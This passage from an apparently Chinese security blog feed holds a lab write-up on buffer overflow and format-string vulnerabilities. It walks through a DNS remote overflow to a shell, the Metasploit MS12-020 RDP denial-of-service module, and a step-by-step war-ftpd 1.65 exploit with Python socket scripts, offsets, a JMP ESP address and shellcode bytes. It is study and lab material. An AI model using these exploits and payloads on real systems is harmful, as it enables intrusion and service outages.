class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="释放卷信息"><a href="#释放卷信息" class="headerlink" title="释放卷信息"></a>释放卷信息</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">FreeVolumeInfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  </span><br><span class="line">    VOLUME_INFO* v5 = <span class="literal">NULL</span>;</span><br><span class="line">    LIST_ENTRY* v1 = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ExAcquireFastMutex</span>(&amp;__VolumeInfoLock);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">IsListEmpty</span>(&amp;__VolumeInfoList) == TRUE)</span><br><span class="line">        <span class="keyword">goto</span> Exit;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">IsListEmpty</span>(&amp;__VolumeInfoList) == FALSE)</span><br><span class="line">    &#123;</span><br><span class="line">        v1 = <span class="built_in">RemoveHeadList</span>(&amp;__VolumeInfoList);</span><br><span class="line">        <span class="keyword">if</span> (v1 == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        v5 = <span class="built_in">CONTAINING_RECORD</span>(v1, VOLUME_INFO, ListEntry);</span><br><span class="line">        <span class="keyword">if</span> (v5 == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">FreeBuffer</span>(v5);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">Exit:</span><br><span class="line">    <span class="built_in">InitializeListHead</span>(&amp;__VolumeInfoList);</span><br><span class="line">    <span class="built_in">ExReleaseFastMutex</span>(&amp;__VolumeInfoLock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows Kernel </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>缓冲区溢出漏洞</title>
      <link href="/2024/03/09/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/03/09/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="缓冲区溢出漏洞实战记录"><a href="#缓冲区溢出漏洞实战记录" class="headerlink" title="缓冲区溢出漏洞实战记录"></a>缓冲区溢出漏洞实战记录</h1><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p><strong>缓冲区溢出</strong></p><p>  缓冲区溢出是指当计算机向缓冲区内填充数据时超过了缓冲区本身的容量，溢出的数据覆盖在合法数据上。理想的情况是：程序检查数据长度并不允许输入超过缓冲区长度的字符，但是绝大多数程序都会假设数据长度总是与所分配的储存空间相匹配，这就为缓冲区溢出埋下了隐患。</p><p>  操作系统所使用的缓冲区，又被称为”堆栈”。在各个操作进程之间，指令会被临时储存在“堆栈”中，“堆栈”也会出现缓冲区溢出。</p><p>  缓冲区溢出的危害：在当前网络与分布式系统安全中，被广泛利用的50%以上都是缓冲区溢出，其中最著名的例子是1988年利用fingerd漏洞的蠕虫。而缓冲区溢出中，最为危险的是堆栈溢出，因为入侵者可以利用堆栈溢出，在函数返回时改变返回程序的地址，让其跳转到任意地址，带来的危害是：一种情况是程序崩溃导致拒绝服务，另外一种就是跳转并且执行一段恶意代码，比如得到shell，然后为所欲为。</p><p><strong>MS12-020漏洞</strong></p><p>  微软于2012年3月12日发布安全公告，公布了MS12-020漏洞，漏洞级别为<strong>严重</strong>，这个级别是微软所有漏洞级别的最高级别，意即会对服务和企业运营造成巨大损失。</p><p>  这个漏洞的定义是指操作系统的远程桌面协议存在重大漏洞，入侵者（黑客）可以通过向远程桌面默认端口（3389）发一系列特定RDP包，从而获取超级管理员权限，进而入侵系统。</p><p>  若该主机同时提供80端口服务，那么疑似有相对更大的隐患。</p><p>  根据微软的安全公告，Windows全系列操作系统（WinXP&#x2F;Vista&#x2F;Win7&#x2F;Win2000&#x2F; Win2003&#x2F;Win2008）均存在受控威胁。但因为远程桌面管理的特殊性，几乎所发现的主机都是服务器，PC机暂未发生。</p><h2 id="测试程序"><a href="#测试程序" class="headerlink" title="测试程序"></a>测试程序</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*buffer.c</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> name[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(“Please input your name: ”);</span><br><span class="line"></span><br><span class="line"><span class="built_in">gets</span>(name);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(“your name is : %s!”, name);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="利用溢出工具溢出目标系统，获取目标系统shell"><a href="#利用溢出工具溢出目标系统，获取目标系统shell" class="headerlink" title="利用溢出工具溢出目标系统，获取目标系统shell"></a>利用溢出工具溢出目标系统，获取目标系统shell</h2><p>DNS远程溢出的漏洞直接对主机进行溢出攻击，成功后一般会直接获得系统权限。如：Windows DNS API（CVE-2017-11779）</p><p>扫描靶机信息</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dns -s ip</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20240208123245234.png" alt="image-20240208123245234"></p><p>找到目标端口1027。选中2003chs进行攻击。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dns -t 2003chs 10.1.1.2 1027</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20240208123716348.png" alt="image-20240208123716348"></p><p>结果显示1100tcp端口被攻击。现在用telnet远程登陆上去。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 10.1.1.2 1100</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20240208123918829.png" alt="image-20240208123918829"></p><p>system32目录下，此时已是管理员权限。</p><h2 id="利用MS12-020漏洞溢出目标系统，使目标系统瘫痪"><a href="#利用MS12-020漏洞溢出目标系统，使目标系统瘫痪" class="headerlink" title="利用MS12-020漏洞溢出目标系统，使目标系统瘫痪"></a>利用MS12-020漏洞溢出目标系统，使目标系统瘫痪</h2><p>运行Metasploit，搜集目标主机的目标端口（3389）和其他信息。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db_nmap -sT -p3389  10.1.1.2</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20240208124537342.png" alt="image-20240208124537342"></p><p>搜索模块</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms12_020</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20240208124748108.png" alt="image-20240208124748108"></p><p>显示了位置。接下来进行利用。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/dos/windows/rdp/ms12_020_maxchannelids</span><br><span class="line">show options</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20240208125200990.png" alt="image-20240208125200990"></p><p>根据提示设置参数。第二个参数已经被设置。设置好后，使用exploit命令利用。</p><p><img src="/.io//image-20240208125414865.png" alt="image-20240208125414865"></p><p>已瘫痪。无法ping通。</p><h1 id="缓冲区溢出调试"><a href="#缓冲区溢出调试" class="headerlink" title="缓冲区溢出调试"></a>缓冲区溢出调试</h1><h2 id="背景-1"><a href="#背景-1" class="headerlink" title="背景"></a>背景</h2><p>war-ftpd 1.65存在缓冲区溢出漏洞，当登录时用户名过长时就会发生缓冲区溢出，程序进而崩溃。本实验正是利用这一点使用调试工具cdb找出溢出时相应寄存器记录的地址，通过利用shellcode构造用户名字符串，使得war-ftpd程序接收此用户名时发生溢出进而执行shellcode，达到攻击目的。</p><h2 id="触发漏洞"><a href="#触发漏洞" class="headerlink" title="触发漏洞"></a>触发漏洞</h2><p>打开war-ftpd.exe，使用ollydbg attach到这个进程上。没有mona插件，后面都用Immunity Debugger继续调试。</p><p><img src="/.io//image-20240208140653599.png" alt="image-20240208140653599"></p><p>利用Immunity Debugger的mona插件来生成1000个字节。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona pattern_create 1000</span><br></pre></td></tr></table></figure><p>命令执行后会在这个目下C:\Program Files\Immunity Inc\Immunity Debugger 生成pattern.txt，里面存放了1000 bytes的junkcode.</p><p><img src="/.io//image-20240208141409611.png" alt="image-20240208141409611"></p><p><strong>点击左上角的闪电，打开21端口。</strong></p><p>利用python编写一个Socket程序将这些字节赋值给username段，发送给var-ftpd使之溢出。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment">#生成的1000个字节</span></span><br><span class="line">pattern =       <span class="string">&#x27;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#TCP流套接字</span></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment">#建立连接</span></span><br><span class="line">s.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">21</span>))</span><br><span class="line">data = s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;connect...&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#在用户名处填充pattern</span></span><br><span class="line">s.send(<span class="string">&#x27;USER &#x27;</span>+pattern+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">data = s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">&#x27;PASS &#x27;</span>+<span class="string">&#x27;123456&#x27;</span>+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;finish!&#x27;</span></span><br></pre></td></tr></table></figure><p>发送后，Immunity Debugger调试器跟踪如下：</p><p><img src="/.io//image-20240208144454773.png" alt="image-20240208144454773"></p><p><img src="/.io//image-20240208143841088.png" alt="image-20240208143841088"></p><p>ESP&#x3D;71413471，EIP&#x3D;32714131</p><p>现在计算这两个地址在1000字节字符串中的偏移地址，依旧使用mona插件。</p><p><img src="/.io//image-20240208144146800.png" alt="image-20240208144146800"></p><p><img src="/.io//image-20240208144156538.png" alt="image-20240208144156538"></p><p>可知EIP偏移为485，ESP偏移为493。这意味着485个字节后的EIP寄存器开始被缓冲区覆盖那么EIP中486-489字节是我们想要的目标。</p><p>CPU通过EIP寄存器中的值知道下一个要运行的指令，在内存地址中运行这些当前的指令，在EIP的内存位置中使用JMP ESP指令使CPU来执行指令和“跳”到ESP寄存器中执行驻留在该地址的内存中的指令。我们的目的就是在EIP中使用JMP ESP指令，这样我们就能控制执行命令并把我们的代码转变到ESP寄存器中。</p><p>两个寄存器之间有8个字节，于是我们用4个字节来填充我们的缓冲区，缩小间距和连接到ESP寄存器。我们使用保持1000字节边界的框架漏洞来调整缓冲区：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment">#Fuzz string</span></span><br><span class="line">pattern = <span class="string">&quot;\x41&quot;</span>*<span class="number">485</span> + <span class="string">&quot;\x42\x42\x42\x42&quot;</span> + <span class="string">&quot;\x43&quot;</span>*<span class="number">4</span> + <span class="string">&quot;\x44&quot;</span>*<span class="number">507</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#TCP流套接字</span></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment">#建立连接</span></span><br><span class="line">s.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">21</span>))</span><br><span class="line">data = s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;connect...&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#在用户名处填充pattern</span></span><br><span class="line">s.send(<span class="string">&#x27;USER &#x27;</span>+pattern+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">data = s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">&#x27;PASS &#x27;</span>+<span class="string">&#x27;123456&#x27;</span>+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;finish!&#x27;</span></span><br></pre></td></tr></table></figure><p>在Immunity debugger中重启FTP服务器，按播放键取消暂停的应用程序。</p><p>将更改后的程序运行，调试器跟踪如下:</p><p><img src="/.io//image-20240208144320345.png" alt="image-20240208144320345"></p><p>如预期一样，EIP存储了4个42，EIP到ESP间填充了4个43。得到ESP开始和结束的内存地址：start：00AEFD48 end：00AEFF3F。00AEFF3F-00AEFD48转换十进制后计算得知为487，意味着可以用487个字节来存放shellcode。</p><h2 id="构造ShellCode"><a href="#构造ShellCode" class="headerlink" title="构造ShellCode"></a>构造ShellCode</h2><p>现在，我们有了目标内存地址和指令，我们需要一种方法获得从EIP寄存器到ESP寄存器的指令，为了做到这一点，我们可以在windows操作系统的DLL中使用现有的JMP ESP指令。</p><p>单击Immunity debugger器的工具栏上的“e”，在存在的windows dll中查找JMP ESP指令，之后双击一个DLL，右键单击“搜索”，选择“command”，之后键入“JMP ESP”。在kernel32.dll系统文件中发现了我们要找的指令，然后记下JMP ESP的内存地址。</p><p><img src="/.io//image-20240208144428779.png" alt="image-20240208144428779"></p><p>EIP中包含JMP ESP的目标地址(7C86467B)和我们的CCs在ESP(00AEFD48)开始。现在，我们控制执行命令，剩下的就是用shellcode替换掉占位的CCs。</p><p>构造漏洞利用的登录用户名字符串，如下所示</p><p><img src="/.io//image-20240208144642011.png" alt="image-20240208144642011"></p><p>使用metasploit的msfpayload来创建payload。有一点要注意：因为我们传递的都是字符串，我们必须要遵守字符限制的FTP 协议。这就意味着没有空，返回，换行，或是@符号，他们用16进制的表示为\x00, \x0d, \x0a, 0×40。”\x40\xff\x3d\x20”可以阻止shellcode执行。</p><p><img src="/.io//image-20240208151654511.png" alt="image-20240208151654511"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">shellcode=<span class="string">&quot;\xbf\x4d\xd5\x02\xce\xdb\xc0\xd9\x74\x24\xf4\x58\x29\xc9&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode+=<span class="string">&quot;\xb1\x33\x31\x78\x15\x03\x78\x15\x83\xc0\x04\xe2\xb8\x29&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode+=<span class="string">&quot;\xea\x47\x42\xd2\xeb\x37\xcb\x37\xda\x65\xaf\x3c\x4f\xba&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode+=<span class="string">&quot;\xa4\x11\x7c\x31\xe8\x81\xf7\x37\x24\xa5\xb0\xf2\x12\x88&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode+=<span class="string">&quot;\x41\x33\x9a\x46\x81\x55\x66\x95\xd6\xb5\x57\x56\x2b\xb7&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode+=<span class="string">&quot;\x90\x8b\xc4\xe5\x49\xc7\x77\x1a\xfe\x95\x4b\x1b\xd0\x91&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode+=<span class="string">&quot;\xf4\x63\x55\x65\x80\xd9\x54\xb6\x39\x55\x1e\x2e\x31\x31&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode+=<span class="string">&quot;\xbe\x4f\x96\x21\x82\x06\x93\x92\x71\x99\x75\xeb\x7a\xab&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode+=<span class="string">&quot;\xb9\xa0\x45\x03\x34\xb8\x82\xa4\xa7\xcf\xf8\xd6\x5a\xc8&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode+=<span class="string">&quot;\x3b\xa4\x80\x5d\xd9\x0e\x42\xc5\x39\xae\x87\x90\xca\xbc&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode+=<span class="string">&quot;\x6c\xd6\x94\xa0\x73\x3b\xaf\xdd\xf8\xba\x7f\x54\xba\x98&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode+=<span class="string">&quot;\x5b\x3c\x18\x80\xfa\x98\xcf\xbd\x1c\x44\xaf\x1b\x57\x67&quot;</span> +</span><br><span class="line"></span><br><span class="line">shellcode+=<span class="string">&quot;\xa4\x1a\x3a\xe2\x3b\xae\x41\x4b\x3b\xb0\x49\xfc\x54\x81&quot;</span> +</span><br><span class="line"></span><br><span class="line">shellcode+=<span class="string">&quot;\xc2\x93\x23\x1e\x01\xd0\xdc\x54\x0b\x71\x75\x31\xde\xc3&quot;</span> +</span><br><span class="line"></span><br><span class="line">shellcode+=<span class="string">&quot;\x18\xc2\x35\x07\x25\x41\xbf\xf8\xd2\x59\xca\xfd\x9f\xdd&quot;</span> +</span><br><span class="line"></span><br><span class="line">shellcode+=<span class="string">&quot;\x27\x8c\xb0\x8b\x47\x23\xb0\x99\x24\xae\x2a\x02\x85\x5b&quot;</span> +</span><br><span class="line"></span><br><span class="line">shellcode+=<span class="string">&quot;\x93\x21\xb8\xf7\xb0\xa5&quot;</span></span><br></pre></td></tr></table></figure><p>在shellcode前添加了10个NOP，使之更好执行流程到它的最终目标。</p><p>pattern &#x3D; “\x41”485 + “\x7B\x46\x86\x7C” + “\x42”4 + “\x90”10”+ shellcode \xCC”*267 (497-230(shellcode长度))</p><p>将构造好的EXP发送给开放21端口且运行war-ftpd的XP本机：</p><h1 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h1><h2 id="背景-2"><a href="#背景-2" class="headerlink" title="背景"></a>背景</h2><p>格式化字符串漏洞是一个很古老的漏洞了，现在几乎已经见不到这类漏洞的身影，但是作为漏洞分析的初学者来说，还是很有必要研究一下的。</p><p>格式化字符串漏洞是由像printf(user_input)这样的代码引起的，其中user_input是用户输入的数据，具有Set-UID root权限的这类程序在运行的时候，printf语句将会变得非常危险，因为它可能会导致下面的结果：</p><p>1.使得程序崩溃</p><p>2.任意一块内存读取数据</p><p>3.修改任意一块内存里的数据</p><p>最后一种结果是非常危险的，因为它允许用户修改set-UID root程序内部变量的值，从而改变这些程序的行为。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span> (<span class="string">&quot;The magic number is: %d&quot;</span>, <span class="number">1911</span>);</span><br></pre></td></tr></table></figure><p>试观察运行以上语句，会发现字符串”The magic number is: %d”中的格式符％d被参数（1911）替换，因此输出变成了“The magic number is: 1911”。 </p><p>格式化函数的行为由格式化字符串控制，printf函数从栈上取得参数。</p><p><img src="/.io//image-20240208161506399.png" alt="image-20240208161506399"></p><p><strong>如果参数数量不匹配会发生什么？</strong></p><p>如果只有一个不匹配会发生什么？</p><p>printf (“a has value %d, b has value %d, c is at address: %08x\n”,a, b);</p><p>1，在上面的例子中格式字符串需要3个参数，但程序只提供了2个。</p><p>2，该程序能够通过编译么？</p><p>⑴printf()是一个参数长度可变函数。因此，仅仅看参数数量是看不出问题的。</p><p>⑵为了查出不匹配，编译器需要了解printf()的运行机制，然而编译器通常不做这类分析。</p><p>⑶有些时候，格式字符串并不是一个常量字符串，它在程序运行期间生成(比如用户输入)，因此，编译器无法发现不匹配。</p><p>3，那么printf()函数自身能检测到不匹配么？</p><p>⑴printf()从栈上取得参数，如果格式字符串需要3个参数，它会从栈上取3个，除非栈被标记了边界，printf()并不知道自己是否会用完提供的所有参数。</p><p>⑵既然没有那样的边界标记。printf()会持续从栈上抓取数据，在一个参数数量不匹配的例子中，它会抓取到一些不属于该函数调用到的数据。</p><p>4，如果有人特意准备数据让printf抓取会发生什么呢？</p><p><strong>访问任意位置内存</strong></p><p>1，我们需要得到一段数据的内存地址，但我们无法修改代码，供我们使用的只有格式字符串。</p><p>2，如果我们调用 printf(%s) 时没有指明内存地址, 那么目标地址就可以通过printf函数，在栈上的任意位置获取。printf函数维护一个初始栈指针,所以能够得到所有参数在栈中的位置</p><p>3，观察: 格式字符串位于栈上. 如果我们可以把目标地址编码进格式字符串，那样目标地址也会存在于栈上，在接下来的例子里，格式字符串将保存在栈上的缓冲区中。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> user_input[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">    ... ... <span class="comment">/* other variable definitions and statements */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, user_input); <span class="comment">/* getting a string from user */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(user_input); <span class="comment">/* Vulnerable place */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>4，如果我们让printf函数得到格式字符串中的目标内存地址 (该地址也存在于栈上), 我们就可以访问该地址.</p><p>printf (“\x10\x01\x48\x08 %x %x %x %x %s”);</p><p>5，\x10\x01\x48\x08 是目标地址的四个字节， 在C语言中, \x10 告诉编译器将一个16进制数0×10放于当前位置（占1字节）。如果去掉前缀\x10就相当于两个ascii字符1和0了，这就不是我们所期望的结果了。</p><p>6，%x 导致栈指针向格式字符串的方向移动</p><p>7，下图解释了攻击方式，如果用户输入中包含了以下格式字符串 </p><p><img src="/.io//image-20240208161732206.png" alt="image-20240208161732206"></p><p>如图所示，我们使用四个%x来移动printf函数的栈指针到我们存储格式字符串的位置，一旦到了目标位置，我们使用％s来打印，它会打印位于地址0×10014808的内容，因为是将其作为字符串来处理，所以会一直打印到结束符为止。</p><p>user_input数组到传给printf函数参数的地址之间的栈空间不是为了printf函数准备的。但是，因为程序本身存在格式字符串漏洞，所以printf会把这段内存当作传入的参数来匹配％x。</p><p>最大的挑战就是想方设法找出printf函数栈指针(函数取参地址)到user_input数组的这一段距离是多少，这段距离决定了你需要在%s之前输入多少个%x。</p><p><strong>在内存中写一个数字</strong></p><p>%n: 该符号前输入的字符数量会被存储到对应的参数中去</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span> (<span class="string">&quot;12345%n&quot;</span>, &amp;i);</span><br></pre></td></tr></table></figure><p>1，数字5（%n前的字符数量）将会被写入i 